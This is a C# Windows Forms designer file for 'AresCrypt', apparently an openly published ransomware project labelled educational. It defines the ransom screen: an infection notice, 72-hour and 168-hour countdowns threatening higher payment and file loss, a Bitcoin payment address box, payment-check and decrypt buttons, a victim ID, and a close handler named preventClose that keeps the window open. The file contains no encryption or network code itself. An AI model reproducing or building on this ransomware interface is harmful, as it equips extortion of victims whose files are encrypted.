namespace arescrypt
{
    partial class Display
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
                components.Dispose();
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Display));
            this.label1 = new System.Windows.Forms.Label();
            this.displayMessage = new System.Windows.Forms.TextBox();
            this.arescryptLogo = new System.Windows.Forms.PictureBox();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.paymentTimer_Rise = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.paymentTimer_Lost = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.copyBtn = new System.Windows.Forms.Button();
            this.cryptoAddress = new System.Windows.Forms.TextBox();
            this.amountChargeNotice = new System.Windows.Forms.Label();
            this.checkpaymentBtn = new System.Windows.Forms.Button();
            this.decryptBtn = new System.Windows.Forms.Button();
            this.riseTimer = new System.Windows.Forms.Timer(this.components);
            this.aboutBitcoin = new System.Windows.Forms.LinkLabel();
            this.aboutBuyingBitcoins = new System.Windows.Forms.LinkLabel();
            this.contactButton = new System.Windows.Forms.LinkLabel();
            this.lostTimer = new System.Windows.Forms.Timer(this.components);
            this.uniqueKeyDisplay = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            ((System.ComponentModel.ISupportInitialize)(this.arescryptLogo)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.Location = new System.Drawing.Point(0, 0);
            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(150, 35);
            this.label1.TabIndex = 3;
            // 
            // displayMessage
            // 
            this.displayMessage.BackColor = System.Drawing.SystemColors.Control;
            this.displayMessage.Font = new System.Drawing.Font("Verdana", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.displayMessage.Location = new System.Drawing.Point(370, 75);
            this.displayMessage.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.displayMessage.Multiline = true;
            this.displayMessage.Name = "displayMessage";
            this.displayMessage.ReadOnly = true;
            this.displayMessage.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.displayMessage.Size = new System.Drawing.Size(1195, 507);
            this.displayMessage.TabIndex = 16;
            this.displayMessage.Text = resources.GetString("displayMessage.Text");
            this.displayMessage.WordWrap = false;
            // 
            // arescryptLogo
            // 
            this.arescryptLogo.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("arescryptLogo.BackgroundImage")));
            this.arescryptLogo.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.arescryptLogo.Location = new System.Drawing.Point(18, 14);
            this.arescryptLogo.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.arescryptLogo.Name = "arescryptLogo";
            this.arescryptLogo.Size = new System.Drawing.Size(344, 318);
            this.arescryptLogo.TabIndex = 2;
            this.arescryptLogo.TabStop = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(375, 20);
            this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(834, 55);
            this.label2.TabIndex = 4;
            this.label2.Text = "You have been infected by AresCrypt!\r\n";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.paymentTimer_Rise);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Location = new System.Drawing.Point(18, 342);
            this.groupBox1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.groupBox1.Size = new System.Drawing.Size(344, 122);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            // 
            // paymentTimer_Rise
            // 
            this.paymentTimer_Rise.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.paymentTimer_Rise.ForeColor = System.Drawing.Color.White;
            this.paymentTimer_Rise.Location = new System.Drawing.Point(110, 62);
            this.paymentTimer_Rise.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.paymentTimer_Rise.Name = "paymentTimer_Rise";
            this.paymentTimer_Rise.Size = new System.Drawing.Size(132, 37);
            this.paymentTimer_Rise.TabIndex = 1;
            this.paymentTimer_Rise.Text = "72:00:00\r\n";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(33, 25);
            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(294, 33);
            this.label3.TabIndex = 0;
            this.label3.Text = "Payment will Rise On";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.paymentTimer_Lost);
            this.groupBox2.Controls.Add(this.label6);
            this.groupBox2.Location = new System.Drawing.Point(18, 463);
            this.groupBox2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.groupBox2.Size = new System.Drawing.Size(344, 122);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            // 
            // paymentTimer_Lost
            // 
            this.paymentTimer_Lost.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.paymentTimer_Lost.ForeColor = System.Drawing.Color.White;
            this.paymentTimer_Lost.Location = new System.Drawing.Point(102, 62);
            this.paymentTimer_Lost.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.paymentTimer_Lost.Name = "paymentTimer_Lost";
            this.paymentTimer_Lost.Size = new System.Drawing.Size(140, 37);
            this.paymentTimer_Lost.TabIndex = 1;
            this.paymentTimer_Lost.Text = "168:00:00\r\n";
            // 
            // label6
            // 
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(9, 25);
            this.label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(326, 37);
            this.label6.TabIndex = 0;
            this.label6.Text = "Your files will be lost on";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.copyBtn);
            this.groupBox3.Controls.Add(this.cryptoAddress);
            this.groupBox3.Controls.Add(this.amountChargeNotice);
            this.groupBox3.Location = new System.Drawing.Point(370, 594);
            this.groupBox3.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.groupBox3.Size = new System.Drawing.Size(1195, 136);
            this.groupBox3.TabIndex = 7;
            this.groupBox3.TabStop = false;
            // 
            // copyBtn
            // 
            this.copyBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.copyBtn.Location = new System.Drawing.Point(990, 66);
            this.copyBtn.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.copyBtn.Name = "copyBtn";
            this.copyBtn.Size = new System.Drawing.Size(160, 43);
            this.copyBtn.TabIndex = 8;
            this.copyBtn.Text = "Copy";
            this.copyBtn.UseVisualStyleBackColor = true;
            this.copyBtn.Click += new System.EventHandler(this.copyBtn_Click);
            // 
            // cryptoAddress
            // 
            this.cryptoAddress.Font = new System.Drawing.Font("Verdana", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cryptoAddress.Location = new System.Drawing.Point(28, 66);
            this.cryptoAddress.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.cryptoAddress.Multiline = true;
            this.cryptoAddress.Name = "cryptoAddress";
            this.cryptoAddress.ReadOnly = true;
            this.cryptoAddress.Size = new System.Drawing.Size(954, 40);
            this.cryptoAddress.TabIndex = 17;
            this.cryptoAddress.Text = "Crypto Address";
            // 
            // amountChargeNotice
            // 
            this.amountChargeNotice.AutoSize = true;
            this.amountChargeNotice.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.amountChargeNotice.ForeColor = System.Drawing.Color.White;
            this.amountChargeNotice.Location = new System.Drawing.Point(22, 25);
            this.amountChargeNotice.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.amountChargeNotice.Name = "amountChargeNotice";
            this.amountChargeNotice.Size = new System.Drawing.Size(566, 33);
            this.amountChargeNotice.TabIndex = 0;
            this.amountChargeNotice.Text = "Send $__ worth of Bitcoins to this address:";
            // 
            // checkpaymentBtn
            // 
            this.checkpaymentBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkpaymentBtn.Location = new System.Drawing.Point(370, 740);
            this.checkpaymentBtn.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.checkpaymentBtn.Name = "checkpaymentBtn";
            this.checkpaymentBtn.Size = new System.Drawing.Size(291, 57);
            this.checkpaymentBtn.TabIndex = 9;
            this.checkpaymentBtn.Text = "Check Payment";
            this.checkpaymentBtn.UseVisualStyleBackColor = true;
            this.checkpaymentBtn.Click += new System.EventHandler(this.checkpaymentBtn_Click);
            // 
            // decryptBtn
            // 
            this.decryptBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.decryptBtn.Location = new System.Drawing.Point(1274, 740);
            this.decryptBtn.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.decryptBtn.Name = "decryptBtn";
            this.decryptBtn.Size = new System.Drawing.Size(291, 57);
            this.decryptBtn.TabIndex = 10;
            this.decryptBtn.Text = "Decrypt Files";
            this.decryptBtn.UseVisualStyleBackColor = true;
            this.decryptBtn.Click += new System.EventHandler(this.decryptBtn_Click);
            // 
            // riseTimer
            // 
            this.riseTimer.Enabled = true;
            this.riseTimer.Interval = 1000;
            this.riseTimer.Tick += new System.EventHandler(this.riseTimer_Tick);
            // 
            // aboutBitcoin
            // 
            this.aboutBitcoin.AutoSize = true;
            this.aboutBitcoin.LinkColor = System.Drawing.Color.White;
            this.aboutBitcoin.Location = new System.Drawing.Point(98, 623);
            this.aboutBitcoin.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.aboutBitcoin.Name = "aboutBitcoin";
            this.aboutBitcoin.Size = new System.Drawing.Size(104, 20);
            this.aboutBitcoin.TabIndex = 11;
            this.aboutBitcoin.TabStop = true;
            this.aboutBitcoin.Text = "About Bitcoin";
            this.aboutBitcoin.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.aboutBitcoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBitcoin_LinkClicked);
            // 
            // aboutBuyingBitcoins
            // 
            this.aboutBuyingBitcoins.AutoSize = true;
            this.aboutBuyingBitcoins.LinkColor = System.Drawing.Color.White;
            this.aboutBuyingBitcoins.Location = new System.Drawing.Point(98, 673);
            this.aboutBuyingBitcoins.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.aboutBuyingBitcoins.Name = "aboutBuyingBitcoins";
            this.aboutBuyingBitcoins.Size = new System.Drawing.Size(155, 20);
            this.aboutBuyingBitcoins.TabIndex = 12;
            this.aboutBuyingBitcoins.TabStop = true;
            this.aboutBuyingBitcoins.Text = "How to buy bitcoins?";
            this.aboutBuyingBitcoins.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.aboutBuyingBitcoins.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBuyingBitcoin_LinkClicked);
            // 
            // contactButton
            // 
            this.contactButton.AutoSize = true;
            this.contactButton.LinkColor = System.Drawing.Color.White;
            this.contactButton.Location = new System.Drawing.Point(98, 730);
            this.contactButton.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.contactButton.Name = "contactButton";
            this.contactButton.Size = new System.Drawing.Size(65, 20);
            this.contactButton.TabIndex = 13;
            this.contactButton.TabStop = true;
            this.contactButton.Text = "Contact";
            this.contactButton.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.contactButton.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.contactButton_LinkClicked);
            // 
            // lostTimer
            // 
            this.lostTimer.Enabled = true;
            this.lostTimer.Interval = 1000;
            this.lostTimer.Tick += new System.EventHandler(this.lostTimer_Tick);
            // 
            // uniqueKeyDisplay
            // 
            this.uniqueKeyDisplay.Font = new System.Drawing.Font("Verdana", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.uniqueKeyDisplay.Location = new System.Drawing.Point(826, 749);
            this.uniqueKeyDisplay.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.uniqueKeyDisplay.Name = "uniqueKeyDisplay";
            this.uniqueKeyDisplay.ReadOnly = true;
            this.uniqueKeyDisplay.Size = new System.Drawing.Size(378, 37);
            this.uniqueKeyDisplay.TabIndex = 14;
            this.uniqueKeyDisplay.Text = "Unique ID";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.label4.Location = new System.Drawing.Point(688, 765);
            this.label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(123, 20);
            this.label4.TabIndex = 15;
            this.label4.Text = "Unique User ID:";
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.Color.Black;
            this.textBox1.Location = new System.Drawing.Point(370, 38);
            this.textBox1.Margin = new System.Windows.Forms.Padding(0);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(0, 26);
            this.textBox1.TabIndex = 1;
            // 
            // Display
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSize = true;
            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.AutoValidate = System.Windows.Forms.AutoValidate.Disable;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(1577, 805);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.uniqueKeyDisplay);
            this.Controls.Add(this.contactButton);
            this.Controls.Add(this.aboutBuyingBitcoins);
            this.Controls.Add(this.aboutBitcoin);
            this.Controls.Add(this.decryptBtn);
            this.Controls.Add(this.checkpaymentBtn);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.arescryptLogo);
            this.Controls.Add(this.displayMessage);
            this.Controls.Add(this.label1);
            this.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Display";
            this.Padding = new System.Windows.Forms.Padding(5);
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "AresCrypt v1.0 - An educational project built by @BlackVikingPro and @BlackBirdDr" +
    "";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.preventClose);
            ((System.ComponentModel.ISupportInitialize)(this.arescryptLogo)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.PictureBox arescryptLogo;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label paymentTimer_Rise;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Label paymentTimer_Lost;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Button copyBtn;
        private System.Windows.Forms.TextBox cryptoAddress;
        private System.Windows.Forms.Label amountChargeNotice;
        private System.Windows.Forms.Button checkpaymentBtn;
        private System.Windows.Forms.Button decryptBtn;
        private System.Windows.Forms.Timer riseTimer;
        private System.Windows.Forms.LinkLabel aboutBitcoin;
        private System.Windows.Forms.LinkLabel aboutBuyingBitcoins;
        private System.Windows.Forms.LinkLabel contactButton;
        private System.Windows.Forms.Timer lostTimer;
        public System.Windows.Forms.TextBox displayMessage;
        public System.Windows.Forms.TextBox uniqueKeyDisplay;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox textBox1;
    }
}